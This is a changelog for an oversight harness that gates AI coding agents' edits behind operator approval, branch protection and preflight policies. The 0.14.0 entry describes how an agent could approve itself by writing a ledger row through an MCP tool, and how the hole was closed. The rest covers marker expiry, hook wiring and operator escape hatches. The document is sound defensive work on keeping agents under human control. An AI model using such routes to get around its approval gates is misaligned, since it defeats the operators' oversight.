- **Profile dependency clarity in README + wizard** (harness/75de11c4). README, `docs/init-interactive.md`, `docs/for-humans.md`, the wizard's profile-choice descriptions, and the Team-profile confirm prompt now state the external-account assumptions of each profile up-front: Solo is standalone, Team requires an agent-tasks account, Full additionally requires `@lannguyensi/agent-preflight` and `gh` on PATH. The wizard also prints a post-init reminder for Team/Full operators naming `agent-tasks-mcp-bridge login` as the auth recovery path and `--template solo` as the fallback for non-agent-tasks workflows.

## [0.18.0] - 2026-05-17

**Headline: per-task understanding-gate marker expiry.** Through v0.17.x the approval marker had no lifetime: one `harness approve understanding` covered every subsequent Edit / Write / Bash for the whole session. That contract was correct when the gate was about "agent starts a session, picks ONE interpretation, runs", but no longer matches multi-task sessions, where a stale interpretation can silently drive the next task's edits. Live failure mode from the v0.17.4 dogfood: three sequential tasks in one session, marker stayed valid across all three, the third task started implementing the wrong fix surface before the operator caught the misdiagnose. v0.18 expires the marker on configurable task-boundary tools and (optionally) on a TTL safety net, so a fresh task gets a fresh Understanding Report. Backing task: agent-tasks/d8ee60ca.

**Operator action required (sort of):** the new behaviour is default-on for every install via `harness init --template solo / team / full` and via `init --interactive` Custom. Existing manifests that already use the pack will see the stricter behaviour on the next `harness apply` if they re-render from the template. Operators who prefer the legacy "one approval per session, no expiry" contract opt out by setting `policy_packs[].config.approval_lifecycle: { mode: "session" }`. Manifests that copy the pack config verbatim from the README / docs and pin it inline keep working unchanged until they explicitly add the new block.

### Added

- **`config.approval_lifecycle` on the understanding-before-execution pack** (agent-tasks/d8ee60ca). New schema-shape under the pack's `config:`:

  ```yaml
  policy_packs:
    - name: understanding-before-execution
      config:
        approval_lifecycle:
          expire_on_tool_match:
            - mcp__agent-tasks__task_finish
            - mcp__agent-tasks__task_abandon
            - mcp__agent-tasks__pull_requests_merge
          max_age: 4h
  ```

  `expire_on_tool_match` is a list of tool name patterns whose successful PostToolUse fires marker expiry. `max_age` is a duration (`24h` / `30m` / `PT1H` / ...) that the PreToolUse blocker enforces against the marker's `approvedAt` field. Both are optional. `{ mode: "session" }` opts out of both and restores the legacy behaviour. Coupling note: the default tool list names `mcp__agent-tasks__*` verbs because that is what every wizard-defaulted install uses, but the field is purely string-based, so operators on Linear / JIRA / GitHub Projects override with their own task-system verbs.

- **PostToolUse marker-expiry hook** (`harness pack hook post-tool-use`, new subcommand). Reads the PostToolUse event JSON from stdin and, when the just-completed tool matches the pack's `expire_on_tool_match` list, deletes the per-session approval marker. Fails closed-to-noop: any error path is logged and the hook exits 0, so a bug in this code never escalates into a session-wide tool block. Worst case the marker persists past the intended boundary, which degrades to the legacy per-session contract.

- **`checkApprovalMarker` honours `opts.maxAgeMs`** (extended). When set, a marker whose `approvedAt` is older than `now - maxAgeMs` is treated as expired and returns `matched:false` with an "expired" detail, so the agent sees the same "no approval" UX as a never-approved session and must re-approve. A marker with no readable `approvedAt` (body corrupted, missing field) skips the freshness check, so the existence-only DoS-resistance contract from v0.13.0 still wins.

### Changed

- **`init --template solo / team / full` + Custom-composer all ship `approval_lifecycle` defaults by default.** Re-running `harness init --force` on an existing install picks them up; an existing operator-edited manifest keeps the legacy behaviour unchanged until the operator manually adds the block or re-renders from a template.

- **`policy_packs[].config.approval_lifecycle` flows into the pack-expand surface.** `expandPolicyPacks` now contributes 4 Claude hooks instead of 3 (UserPromptSubmit + Stop + PreToolUse + the new PostToolUse). Operators who pinned the v0.17 3-hook shape in custom infrastructure should expect the new hook in their generated `settings.json` after the next `harness apply`.

### Verification

- `npm test`: 1361/1361 (was 1344, +17 new tests across `tests/cli/pack-hook-post-tool-use.test.ts`, `tests/policy-packs/marker-max-age.test.ts`, and additions to `tests/policy-packs/expand.test.ts`).
- `npm run typecheck`: clean.
- Golden fixture: `docs/examples/full-manifest.expected.yaml` updated for the new pack config block.

## [0.17.4] - 2026-05-17

**Headline: `harness init --interactive` wire-now actually wires settings.json now.** Closes a silent-no-op bug surfaced during the v0.17.2 dogfood (operator picked Full, picked claude-code in wire-now, but branch-protection's hooks never reached `~/.claude/settings.json`). Root cause: wireRuntime called `apply({ target, merge: true })` without `overwriteDrift`. A pre-existing stale or missing `~/.claude/harness.generated/.last-apply` snapshot made the freshly-rendered `harness.generated/settings.json` look like full-file drift, so apply returned `outcome: "drift-refuse"` without throwing. wireRuntime only checked `targetWritten` and printed nothing when it was false — leaving the operator with a "restart hint" line that implied success while settings.json was never updated. Fix: init's wire-now passes `overwriteDrift: true` with an auto-confirm prompt. Drift safeguards remain in place for ad-hoc `harness apply`; init's canonical "start from scratch" intent now always lands. Backing task: agent-tasks/df68b3e6.

### Fixed

- `src/cli/init/interactive.ts`: wireRuntime for claude-code now passes `overwriteDrift: true` + auto-confirming prompt to apply. Also prints a clear stderr message + sets `recoveryHint` when targetWritten ends up false (instead of being silently empty), so operators are never left guessing why the "wired into ..." line is missing. Adds a regression test (`wire-now bypasses stale-snapshot drift`) that seeds a stale `harness.generated/settings.json` and asserts the wire-now merge still lands.

## [0.17.3] - 2026-05-17

**Headline: `branch-protection` pack now emits the agent-facing `ux:` block on deny.** Closes the gap from v0.17.2 (which shipped the pack in defaults but left its `blockJson` on the legacy "branch-protection: refusing ..." vocabulary, inconsistent with the rest of the 0.17.x UX work). `hook-branch-protection.ts` now reads `config.ux` and renders the plain-language `{ cannot, required, run }` shape with `${BRANCH}` substituted from the resolved git context. Engine-vocabulary BLOCK reason still lands on stderr for operator audit. Backing task: agent-tasks/9806d4f8.

### Changed

- `src/cli/pack/hook-branch-protection.ts`: `blockJson` accepts an optional `ux: PolicyUx` and renders the agent-facing shape via `renderAgentFacing` when set. Adds `parseConfigUx` helper (third copy of this pattern; cleanup follow-up will extract into a shared module).
- `src/cli/init/templates.ts`, `src/cli/init/composer.ts`, `docs/examples/full-manifest.yaml`: ship `ux:` defaults on the branch-protection pack config. Substitutes `${BRANCH}` so the agent sees "You cannot edit files on protected branch master yet." rather than the legacy refusing-on-protected-branch paragraph.

## [0.17.2] - 2026-05-17

**Headline: `branch-protection` pack ships in Full + Custom init defaults.** The pack (#158, v0.16.0) was previously opt-in via `harness pack add branch-protection`, so wizard users picking Full or Custom got an install without master/main protection unless they knew to add it manually. `init --template full` now enables the pack by default; the Custom composer surfaces it as a checkbox option. Existing installs are NOT auto-migrated, see the operator note. Backing task: agent-tasks/2fdc5bbe.

Operator note: this is opinionated default. Workflows that routinely edit master directly (one-file repos, dotfiles, docs-only setups) can opt out with `enabled: false` on the pack entry or by removing the entry from `~/.claude/harness.yaml`. Existing manifests are untouched; pick the new defaults via `harness pack add branch-protection` or by re-running `harness init --force` after backing up.

Known gap (tracked at agent-tasks/9806d4f8, v0.17.3 follow-up): the branch-protection pack's deny envelope still emits legacy engine vocabulary, inconsistent with the rest of the 0.17.x UX work. Will plumb `ux:` through `hook-branch-protection.ts` in a separate patch.

### Changed

- `src/cli/init/templates.ts` (FULL_TEMPLATE), `src/cli/init/composer.ts` (COMPOSABLE_PACKS + pack-emit), `docs/examples/full-manifest.yaml`: ship `branch-protection` pack `enabled: true` with default config (`protected_branches: ["master", "main", "develop"]` via the pack's resolver).

## [0.17.1] - 2026-05-17

**Headline: Solo + Team templates ship `ux:` defaults for parity with Full + Custom.** v0.17.0 wired `ux:` into `init --template full` and `init --interactive` Custom branch, but the Solo and Team profiles in `src/cli/init/profiles.ts` were missed, so wizard users picking either of those got the new release without the UX fix. This patch closes the gap: Solo's understanding-before-execution pack and Team's pack + review-before-merge policy now ship the same plain-language `{ cannot, required, run }` defaults. Existing installs still need to opt in by re-running `init --force` or hand-editing their manifest. Backing task: agent-tasks/60bc93e5.

### Changed

- `src/cli/init/profiles.ts`: Solo and Team templates emit `ux:` defaults matching the Full + Custom shape (agent-tasks/60bc93e5).

## [0.17.0] - 2026-05-17

**Headline: agent-facing policy block messages stop leaking engine vocabulary.** A new optional `ux: { cannot, required[], run[] }` field on every policy and on the understanding-before-execution pack config replaces deny envelopes like `no matching ledger entry for tag preflight:harness` with a plain-language three-section message:

```
You cannot investigate this repository yet.

Required:
- verified repository preflight

Run:
  harness preflight
```

The internal model (session IDs, ledger entries, recordHint, ledgerTag, policy DAGs) is unchanged and still feeds the audit ledger, so `audit` / `explain --trace` / `session-export` keep their full trace. All five block-enforcement built-in policies plus the understanding-gate pack ship `ux:` defaults; the warn-only `two-reviewers-required` policy correctly omits ux (the agent never sees it). The Codex blocker mirrors the Claude blocker's UX through its stderr diagnostic. Adjacent: `harness preflight` is now a top-level alias for `harness session-start preflight` so the `ux.run` lines can show the short form agents should type.

Operator note: no required action. Manifests without `ux:` keep the legacy deny envelope verbatim.

### Added

- **Policy `ux:` block: agent-facing surface separated from engine internals** (agent-tasks/6b74b69d). Optional schema field on every `policies[]` entry: `ux: { cannot, required[], run[] }`. When declared, the deny envelope the agent sees becomes a plain-language three-section message (state / requirement / remedy) instead of engine vocabulary like `no matching ledger entry for tag preflight:harness`. The internal `PolicyDecision` (reason, recordHint, matchedCount, ledgerTag) is unchanged and still feeds the audit ledger, so `audit` / `explain --trace` / `session-export` keep their full trace. Templates substitute `${VAR}` against the same extract.values map the `ledger_tag` resolved against. Producers are suppressed when `ux:` is declared (the `run:` list is the canonical remedy surface; rendering both would give the agent two different command suggestions). The `preflight-before-investigation` and `preflight-before-push` policies ship with `ux:` defaults whose `run:` points at the new `harness preflight` top-level alias for `harness session-start preflight`. The understanding-before-execution pack continues to emit its own engine-vocabulary envelope until agent-tasks/e48e3b45 lands.
- **`ux:` on review-before-merge, review-subagent-before-pr-create, dogfood-before-release** (agent-tasks/902c1b4e). The three remaining built-in policies whose satisfying action is an MCP `ledger_add` recipe rather than a shell verb now ship with `ux:` defaults too. The `run:` field names the MCP verb invocation directly (`mcp__agent-grounding__ledger_add { type: "fact", content: "review:${PR_NUMBER} — <verdict>" }`), mirroring the form the existing `producers:` MCP entries already used and giving the agent a copy-pasteable recipe. Snapshot tests pin the verbatim agent-facing form for each policy.
- **`ux:` on the understanding-before-execution pack (Claude + Codex blockers)** (agent-tasks/e48e3b45). Both PreToolUse pack hooks (`src/cli/pack/hook-pre-tool-use.ts` for Claude Code, `src/cli/pack/hook-codex-pre-tool-use.ts` for Codex) now read an optional `config.ux` block on the pack and render the plain-language `{ cannot, required, run }` shape to the agent surface in place of the legacy "Understanding Gate: ..." + schema-hint vocabulary. The Claude blocker writes the agent-facing form to the stdout JSON `reason` (and `permissionDecisionReason`); the Codex blocker writes it to the stderr diagnostic that drives its non-zero-exit block. In both runtimes the engine-vocabulary BLOCK reason (which names the session id and which approval sources failed) stays on stderr so a flapping gate remains diagnosable from logs. Full-template + composer ship a sensible `ux:` default that names the nine required report sections inline, so agents see a self-contained call-to-action without consulting external docs. Schema reuses `PolicyUxSchema` from the policy layer; malformed configs are logged to stderr and fall back to the legacy envelope.

## [0.16.0] - 2026-05-16

**Headline: structural enforcement for the edit-on-master incident pattern, plus a single-command teardown.** New built-in policy pack `branch-protection` (opt-in) blocks `Write`/`Edit` (claude-code) or `apply_patch` (codex) at the FIRST source mutation when the agent is on a protected branch, complementing `preflight-before-push` (which fires at the LAST reversible step). Where the existing rule lived only in agent-discipline (memory `feedback_one_branch_per_task`), now it lives in the hook chain. Adjacent: `harness uninstall` replaces the manual `rm -rf` rollback recipe with a dry-run-by-default verb that backs up + snapshots before mutation; the Understanding Gate's deny envelope now enumerates the nine sections the parser actually requires so freeform reports stop silently failing; `harness doctor` flags leftover rogue `~/-prefixed` evidence-ledger DBs and the rogue-ledger scan itself got hardened against symlink false-positives.

Operator note: no required action. `branch-protection` is opt-in (`harness pack add branch-protection`); everything else is additive.

### Added

- **Built-in policy pack: `branch-protection`** (#158, agent-tasks/79fd5895). Blocks `Write`/`Edit` (claude-code) or `apply_patch` (codex) at the first source mutation when the agent is on a protected branch. Two satisfying signals: a fresh `branch:non-protected:<branch>` tag from the SessionStart producer (`harness session-start branch-check`, runnable on demand from the operator's `!` shell), or a `branch-protection-ack:<reason>` override the operator writes via `mcp__agent-grounding__ledger_add`. Default protected list `master, main, develop` is overridable via `config.protected_branches`. Fails closed (any load / parse / ledger error refuses, inverse of `understanding-before-execution`'s fail-open contract). Filters `policy_decision` audit rows out of the satisfying-tag scan so a past denied decision against this pack doesn't falsely unblock the next evaluation (mirrors `src/policies/requires.ts:75-83`). OFF by default; enable with `harness pack add branch-protection`. Full reference: `docs/policy-packs/branch-protection.md`.
- **`harness uninstall`** (#157, agent-tasks/92e851f3). Single-command teardown of a harness installation: inventories harness-owned entries in `~/.claude/` (manifest, lock, `harness.generated/`, hook groups + `mcpServers` entries in settings.json, leftover `settings.json.pre-harness-<TS>` backups) and prints them. With `--apply`, removes them after writing a reversible `settings.json.bak.uninstall.<ISO>` + `harness.uninstall.<ISO>.json` snapshot next to settings.json. With `--restore-from <path>`, atomically overwrites settings.json from a pre-harness backup. Ownership rules: hook group owned iff every inner command starts with `harness ` / `npx @lannguyensi/harness `; mcpServers owned = union of manifest's `tools.mcp[].name` and the bundled-template default allowlist (`agent-tasks`, `codebase-oracle`, `grounding-mcp`). Mixed hook groups are left in place with a warning so we never split operator-authored composites. Pattern mirrors `harness gate disable`.
- **Understanding Gate: deny envelope enumerates required parser sections** (#152, agent-tasks/5ec5772d). The PreToolUse gate (both claude-code and codex variants) now lists the nine sections `@lannguyensi/understanding-gate`'s parser requires (currentUnderstanding, intendedOutcome, derivedTodos, acceptanceCriteria, assumptions, openQuestions, outOfScope, risks, verificationPlan) with friendly aliases, plus a one-line explanation of what happens when the parser rejects a freeform report (marker write succeeds, audit trail stays empty). Verified end-to-end: a report shaped from the hint round-trips through `parseReport` with `ok: true`.
- **`harness doctor` flags rogue `~/-prefixed` evidence-ledger DBs** (#151, agent-tasks/232cf592). Bounded scan over `$HOME`, `$HOME/git/*` (one level), and `$PWD` for literal `~` subdirs containing `.evidence-ledger/ledger.db`, the orphan artefact pattern from the `EVIDENCE_LEDGER_DB` literal-tilde leak (PR #101). Findings render in their own "Rogue evidence-ledger DBs" section with a cleanup hint; never auto-deleted. Always-on (warning-only, cheap), counts toward `warningCount`, leaves `errorCount` untouched.

### Changed

- **CI: drift-guard for `understanding-gate` parser SECTIONS** (#153, agent-tasks/a3d329e2). New `npm run check:ug-schema-drift` runs after Build, npm-packs `@lannguyensi/understanding-gate@latest`, regex-extracts the `key:` entries from its SECTIONS array (bracket-balanced slice, ignores the sibling fast_confirm bullet-prefix table), and diffs against `UNDERSTANDING_REPORT_REQUIRED_SECTIONS` in `src/cli/pack/understanding-report-schema-hint.ts`. Detects order mismatch, upstream-added section, and upstream-removed section, surfacing combination cases as both diffs. The decision to pin to `@latest` over a fixed version (vs cron) is recorded in `docs/decisions/0001-ug-drift-guard-pin.md` (#156, agent-tasks/40452b01) with explicit reopen criteria.

### Fixed

- **`harness doctor` rogue-ledger scan hardening** (#154, polish on agent-tasks/232cf592). Four polish items on PR #151: dedup by `realpathSync` (collapses two parent dirs symlinked to the same physical location into one hit, falls back to the joined path on `EACCES`/`ENOENT`); `lstat` the `~` dir so a symlinked `~` pointing at the real `~/.evidence-ledger` doesn't false-flag; shell-quote `rogueDir` in the cleanup-hint output with POSIX-recipe escape for embedded `'` so a repo name like `weird's-repo` doesn't render a copy-paste footgun; extra dedup test for `$HOME/git/<repo> == $PWD`.
- **`ug-drift-guard`: string-aware bracket walker + build-hint precheck + cleanup** (#155). Three follow-ups bundled from PR #152 / #153 review: (a) `extractUpstreamSectionKeys` now tracks string-literal state with `\` escape handling so a SECTIONS alias containing `]` no longer truncates the slice and produces false-positive drift (all three delimiter styles covered); (b) `loadHarnessMirror` existsSync-prechecks the compiled module path and throws a typed error naming `npm run build`, replacing the generic Node "Cannot find module" cascade in the common forgot-to-build case; (c) drop misleading single-alias example from the gate hint intro (the bullets carry the canonical names and the parser's alias-tolerance is a quiet bonus).

## [0.15.0] - 2026-05-16

**Headline: interactive wizard major upgrade.** `harness init --interactive` gains a runtime multiselect for the wire-now step (Claude Code + Codex, with `opencode` parked until its adapter lands) and a real Custom-profile composer at full reference-policy parity (1 pack, 4 MCPs, 6 reference policies, ticked à la carte). The old Custom branch, an advertised menu item that printed "use --template full and hand-edit" and aborted, is gone. Adjacent: every policy's deny envelope now carries a one-line producer hint so a blocked operator sees not just the missing tag but the satisfying contract; runtime tilde expansion on MCP env values at spawn time closes the "literal `~/foo` creates rogue cwd files" footgun for every wired server, not just `grounding-mcp`.

Operator note: no required action. Custom is still opt-in from the wizard, and the new producer hints are additive.

### Added

- **Interactive wizard: runtime multiselect** (#147, agent-tasks/696f7560). The wire-now step is now an `@inquirer/prompts` `checkbox` over `claude-code` and `codex`; whichever runtimes `detect()` found configured are pre-checked so the historical single-runtime flow stays one Enter press. Selecting Codex runs `harness apply --runtime codex` and prints the manual-merge instruction for `~/.codex/config.toml`; selecting both warns the operator that `harness.lock` reflects the last-applied runtime. `opencode` listed disabled until task `f34eb233` lands the runtime adapter.
- **Interactive wizard: Custom-profile composer** (#148 + #149, agent-tasks/31d2fbb5 + 5dd3d8a6). Custom is a real à-la-carte builder: three checkbox prompts (packs / MCPs / policies) feed `composeCustom(selection)` which emits YAML the rest of the wizard's tail (validate → wire-now) consumes unchanged. v0.15.0 ships parity with `--template full`: 1 pack (`understanding-before-execution`), 4 MCPs (`agent-tasks`, `grounding-mcp`, `memory-router` routed under `memory.router`, `codebase-oracle` with an env-var advisory), 6 reference policies (review-before-merge, preflight-before-investigation, review-subagent-before-pr-create, preflight-before-push, dogfood-before-release, two-reviewers-required). Producer-coupling advisories print to stderr when a selected policy has no producer for its ledger tag.
- **Policy deny envelope: producer hints** (#141 + #142 + #143). Every reference policy in `FULL_TEMPLATE` now has a populated `producers:` field rendered into the deny envelope + `harness explain` output. The understanding-gate deny envelope picks up the same treatment so a blocked agent sees the `harness approve understanding` golden path rendered verbatim. The producer choice (`harness session-start preflight` vs `mcp__agent-grounding__ledger_add`) is recorded next to the tag the operator must produce.
- **Wizard dep table: min_version floor** (#144). The "Profile X depends on these binaries" table now shows `pkg@x.y.z+` next to packages whose `min_version` is declared, so operators see the floor a feature needs even without running `harness doctor`.

### Changed

- **`dependenciesForCustom` resolves codebase-oracle + agent-preflight** (#149 dependency layer). Custom selections that tick `codebase-oracle` or any `preflight-*` policy now get the matching binaries added to the wizard's `npm i -g` list, mirroring `PROFILE_DEPENDENCIES.full`.
- **Internal: shared `expandHome` helper** (#146). Three duplicate implementations consolidated into `src/runtime/expand-home.ts`. No behaviour change; refactor lands in the same release as #145 so the fix and the consolidation can be reasoned about together.
- **`codebase-oracle` stays out of the FULL default** (#138 + #139 + #140 net). The thrash trio settles on "not in default, opt-in via Custom composer or hand-edit"; the FULL template now carries an explicit comment explaining the omission plus the manual wiring recipe with required env vars (`ORACLE_SCAN_ROOT`, `OPENAI_API_KEY`).

### Fixed

- **MCP env values: leading `~/` expands at spawn time** (#145). Previously a literal `~/foo` in an `env:` block was passed verbatim, and the receiving MCP server (process started by the runtime, not a login shell) saw no tilde expansion, creating rogue cwd-relative files. Now every value beginning with `~/` is rewritten to `$HOME/...` at the runtime spawn boundary. Closes the same class of incident grounding-mcp hit in v0.14.0.

## [0.14.0] - 2026-05-15

**Headline: understanding-gate self-approval backdoor closed.** Through v0.13.0 the gate read a `understanding-approved:<sessionId>` row from the evidence ledger as approval. The agent has direct MCP access to that ledger via `grounding-mcp`'s `ledger_add`, so any agent could write the row for its own session and self-approve, collapsing the human-in-the-loop control to advisory. v0.14.0 moves the canonical signal to a filesystem marker at `harness.generated/.approvals/<sessionId>` written by `harness approve understanding` from the operator's shell. Edit / Write / Bash are all gated by the same PreToolUse hook and no configured MCP exposes filesystem writes, so the marker is reachable only from operator-launched processes. Headline regression test (`tests/cli/pack-hook-pre-tool-use.test.ts`): an injected ledger row with `source: "mcp"` (exact shape `ledger_add` produces) MUST still block. Pinned for Claude and Codex blockers alike.

**Operator action required**: re-run `harness approve understanding` once in your active session after upgrade. Sessions without a live block need no action.

Adjacent release content: the backdoor closure itself (PR #132, agent-tasks/88ca4bb3); a one-line "to satisfy" hint on every deny envelope and `harness explain` output (PR #131, agent-tasks/32ed47cb); a tighter phrasing for `count.max`-only deny (PR #134, agent-tasks/aee9c085); symlink reject at the marker path (PR #135, agent-tasks/d39f160e); regression guard that `harness apply` preserves `.approvals/` and `.pending-approval` byte-for-byte across re-applies (PR #133, agent-tasks/bf8e1be8); marker-lifetime + session-id-reuse docs subsection (PR #136, agent-tasks/a65c32a8); README + quickstart relabel of `docs/examples/full-manifest.yaml` as a schema-coverage reference (PR #130, agent-tasks/1d1911ec).

### Security (BREAKING for upgraders)

- **Understanding-gate self-approval backdoor closed** (agent-tasks/88ca4bb3). Through v0.13.0 the gate read a `understanding-approved:<sessionId>` ledger row as approval. Because the agent has direct MCP access to `grounding-mcp`'s `ledger_add`, any agent could write that row itself and self-approve, collapsing the gate to advisory. Starting this release the canonical gate signal is `harness.generated/.approvals/<sessionId>`, a filesystem marker that `harness approve understanding` writes from the operator's shell. Edit / Write / Bash are all gated by the same PreToolUse hook, and no configured MCP exposes filesystem writes, so the marker is reachable only from operator-launched processes.
  - The ledger row is still written by `harness approve understanding` for audit / forensics. `harness audit` and the gate's diagnostic output still surface it, labelled `(no longer satisfies the gate)`. The Claude blocker and the Codex blocker share the same change.
  - **Operator action required after upgrade**: re-run `harness approve understanding` once in your active session; the file marker will write and the gate will pass. Sessions that had no live block (`.pending-approval` absent) need no action.
  - **Persisted JSON report path** (the `@lannguyensi/understanding-gate` package's fallback for solo users) is unchanged. The agent's Stop hook only ever writes `pending` reports; flipping to `approved` requires the operator-side rewrite in `harness approve`, which the agent has no path to forge.
  - **`harness apply` preserves `.approvals/` across re-applies** (agent-tasks/bf8e1be8). Regression-pinned by new tests in `tests/cli/apply/apply.test.ts`; `.pending-approval` staging gets the same pin so a future "clean up harness.generated/" refactor cannot regress either file silently.

### Added

- Policy deny messages now include a one-line "to satisfy" hint so a blocked operator sees the satisfying ledger contract, not just the missing tag (agent-tasks/32ed47cb). Format: `<policy>: no matching ledger entry for tag \`<resolved-tag>\`. To satisfy: record an evidence-ledger entry containing \`<tag>\` (session \`<id>\`).` The hint covers the `count.min`/`count.exact` and `within` variants too. Deliberately omits the *how* (no recording verb named) so the deny path stays neutral on producer; see agent-tasks/88ca4bb3 for why pointing at a specific MCP would be the wrong suggestion.
- `harness explain <policy>` (non-trace) now prints a `toSatisfy` line built from the policy's `requires` spec with the un-substituted tag template, so contributors reading the policy contract see the same shape a blocked operator sees in Claude Code.
- `harness explain <policy> --trace` reuses the same hint, synthesised from the current manifest's `requires` so older audit-log payloads (which predate the field) still render `toSatisfy:` in the trace.
- New `buildRecordHint(requires, tag)` exported from `src/policies/index.ts` so consumers can render the same hint without firing an evaluation.

### Changed

- `buildRecordHint` now flips to a `keep evidence-ledger entries containing \`<tag>\` at or below <N>` phrasing for `count.max`-only requires (agent-tasks/aee9c085). The previous "record N entries" shape was exactly the wrong nudge for a "too many already" deny. `count.min`-only and the combined min/max cases keep the recording phrasing (recording more is the satisfying action).
- `checkApprovalMarker` uses `lstatSync` (not `statSync`) and rejects symlinks at the marker path (agent-tasks/d39f160e). Defense-in-depth: the agent has no Edit / Write / Bash path to plant a symlink under `harness.generated/` today, but the gate's contract is to assume the agent is hostile, so the lstat reject is cheap insurance.

### Docs

- `docs/policy-packs/understanding-before-execution.md` "Approval state" gains a "Marker lifetime and session-id reuse" subsection (agent-tasks/a65c32a8). Documents the no-TTL contract, names the two operator-controlled paths that carry approval across logical session boundaries (manual marker copy, scripted session-id reuse), and points operators at `rm harness.generated/.approvals/<sessionId>` for forced re-approval.

## [0.13.0] - 2026-05-15

**Headline: `harness doctor` detects MCP, hook, and memory-router version drift end-to-end.** PR #125 added the `tools.mcp[]` `min_version` schema + production probe and shipped the load-bearing fix for the prior `tools.cli` no-op (`opts.versionProbe` defaulted to `null` outside tests). PR #126 extended the same contract to `hooks[]` and `memory.router`, lifting the numeric compare into a shared `src/io/version-compare.ts` so all three sites use one implementation. PRs #127 and #128 then activated the surface in FULL_TEMPLATE with three concrete floors so a fresh `harness init` ships the drift signal turned on.

Operator note: a fresh `harness init --template full` now expects three published bins on PATH at the floor versions. Upgrade with `npm i -g @agent-tasks/mcp-bridge@latest @lannguyensi/grounding-mcp@latest @lannguyensi/memory-router@latest` if `harness doctor --shallow` reports an outdated entry.

### Added

- `tools.mcp[].min_version` + `tools.mcp[].version_command` (#125): same shape as the existing `tools.cli[]` fields. `harness doctor` runs a production version probe (`spawnSync` with a 5s timeout) and emits a `versions:` sub-block under `MCP servers`. Outdated entries warn (informational, not error: a stale MCP still works). Empty when no entry has `min_version`, to keep the report quiet by default.
- `hooks[].min_version` + `hooks[].version_command` (#126): both must be present together. Hook commands are arbitrary shell strings (`harness session-start preflight`, `~/.claude/hooks/foo.sh`, npm bins, wrappers) so there is no useful default for `version_command`; `min_version` alone is rejected at validate time. Docs nudge operators to point `version_command` at the underlying source-of-truth binary, not at the wrapper.
- `memory.router.min_version` + `memory.router.version_command` (#126): same default shape as `tools.mcp[]`. The check skips when the router is disabled or the executable cannot be located.
- FULL_TEMPLATE pins (#127 + #128) for the three published bins:
  - `agent-tasks-mcp-bridge`: `min_version: "0.6.0"` (PR agent-tasks/240 added the flag, PR agent-tasks/241 cut the release)
  - `grounding-mcp`: `min_version: "0.2.0"` (PR agent-grounding/76 added the flag, PR agent-grounding/77 cut the release)
  - `memory-router-user-prompt-submit`: `min_version: "0.3.0"` (PR agent-memory/40 added the flag, PR agent-memory/41 cut the release)

### Changed

- `cli/index.ts` now wires `defaultVersionProbe` into the doctor invocation (#125). Prior to this, even the existing `tools.cli[]` `min_version` check was a no-op in production because `opts.versionProbe ?? (() => null)` defaulted to null when no test injected a probe. The fix unblocks `tools.cli`, `tools.mcp`, hook, and memory-router probes alike.
- `src/io/version-compare.ts` (#126): new leaf module exporting `compareNumericVersions`. Lifts the duplicated implementation out of `doctor/index.ts` so `memory.ts` can reuse it without re-creating the runtime/policies cycle that #123 just broke.

### Schema

- `McpServerSchema`, `HookSchema`, and `MemoryRouterSchema` all gain optional `min_version: z.string()` and `version_command: z.string()` fields, validated together where co-required.

## [0.12.0] - 2026-05-15

**Headline: the understanding-gate stack is now operator-recoverable
end-to-end.** The persisted-report directory desync that silently broke
`harness approve understanding` from a second terminal (#116) is closed
by anchoring the path to the manifest at apply time. The lockout class
that twice during install dogfood left a session unable to recover
without a hand-crafted Python snippet now has a first-class reversible
escape hatch: `harness gate disable` / `harness gate enable` (#119).
And two adjacent silent-degradation paths are loud now: `harness approve
understanding` surfaces the standalone Stop-hook's parse-error reason
inline instead of just "no reports found" (#117), and
`harness session-start preflight` no longer pretends success when it
silently falls back to the literal "default" session (#118).

### Added

- `harness gate disable` / `harness gate enable`: reversible operator
  escape hatch for hard-blocking hooks. `gate disable` with no flags
  lists every hook group in `~/.claude/settings.json` with its event,
  index, matcher, and command summary; with `--matcher <substring>` it
  removes every group whose matcher contains the substring, writes a
  snapshot of the removed groups to
  `<settings-dir>/harness.gate-disable.<ts>.json`, and backs up the
  original to `settings.json.bak.<ts>` before the live rewrite. `gate
  enable` restores from the newest snapshot, is idempotent on an
  already-restored file, and refuses when settings.json has been edited
  since the snapshot was taken; `--force` overrides and the restore
  only touches the `hooks` key so every other operator-added top-level
  key is preserved verbatim. Both verbs refuse to operate on a
  settings.json that is not a JSON object, so a broken file is
  surfaced rather than silently rewritten. v1 scope: substring matcher
  + latest-snapshot restore; `--event` filter, `--all`, named-snapshot
  selection ship later if demand surfaces. (#119)
- `harness session-start preflight --session <id>`: explicit session-id
  flag for manual or scripted invocations where no SessionStart event
  JSON is piped on stdin. (#118)

### Fixed

- The `understanding-before-execution` pack's persisted-report
  directory was `path.join(process.cwd(), ".understanding-gate",
  "reports")` with no precedence, so the three actors that touch it
  (the standalone Stop hook, the PreToolUse blocker, and `harness
  approve understanding`) silently diverged whenever the operator
  approved from a second terminal. `defaultReportsDir()` now honors
  `UNDERSTANDING_GATE_REPORT_DIR` ahead of the cwd fallback, and
  `harness apply` bakes
  `UNDERSTANDING_GATE_REPORT_DIR=<manifest-dir>/.understanding-gate/reports`
  onto every command the pack contributes (Stop + PreToolUse, both
  claude-code and codex variants). The path is resolved absolute at
  apply time so the spawned hook process inherits a stable location
  regardless of the cwd Claude Code launches it with. `harness approve
  understanding` uses the manifest directory as the fallback cwd, and
  `harness doctor --target codex` switches to the same resolver so its
  reported writable path matches what the rest of the stack actually
  touches. Same bug class as the v0.10.0 EVIDENCE_LEDGER_DB
  literal-tilde fix. (#116)
- `harness approve understanding` reported "no reports found at <dir>"
  as a silent dead end when the standalone Stop hook fired but its
  `parseReport` rejected the agent's last message (missing sections,
  schema errors, etc). The verb now checks the sibling parse-errors
  directory (`<dir-of-reports>/../parse-errors/`, where the standalone
  package writes its diagnostic logs) and surfaces the newest entry's
  `message` or `reason` plus optional `missing[]` array inline in the
  diagnostic. Format-tolerant: the JSON header is preferred, with a
  freeform-line fallback so future Stop-hook log-format changes still
  surface something. Missing parse-errors dir stays silent. (#117)
- `harness session-start preflight` invoked manually (no SessionStart
  event piped on stdin, `$CLAUDE_SESSION_ID` unexported) recorded its
  `preflight:` tags under the literal session `"default"`. The success
  line read as if the producer worked, but no `preflight-before-*`
  policy queries `"default"`, they query the real Claude Code session
  id, so the tag was a no-op. The resolver now mirrors `harness approve
  understanding`'s chain: `--session` flag → stdin `event.session_id`
  → `$CLAUDE_SESSION_ID` → newest Claude Code transcript (the same
  heuristic `harness audit` / `harness explain --trace` use) → literal
  `"default"`, with a loud stderr WARNING when the fallback hits
  explaining that the recorded tag will not satisfy any
  preflight-before-* gate. The result also exposes `sessionId` +
